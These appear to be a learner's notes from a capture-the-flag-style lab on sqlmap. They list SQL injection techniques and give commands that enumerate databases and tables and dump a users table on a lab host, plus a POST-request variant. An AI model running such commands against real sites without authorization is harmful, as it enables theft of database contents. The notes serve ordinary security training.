- To have a guided usage, use `sqlmap --wizard`
- -u specify url, give random arguments to params that could be subject to SQL injection
- Diiferent ways to exploit a SQL Injection:
	- boolean-based blind
		- modify query to add an always true boolean (like 1=1)
	- error-based
	- time-based blind
	- UNION query
- fetch databases: use `--dbs
```shell-session
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
````
- define database to use with -D
- fetch all tables with --tables
```shell-session
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```
- use -T to specify what table use
- use --dump to dump
```shell-session
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
```
- can use post-based injections, must intercept POST request, save it in file
```shell-session
sqlmap -r intercepted_request.txt
```
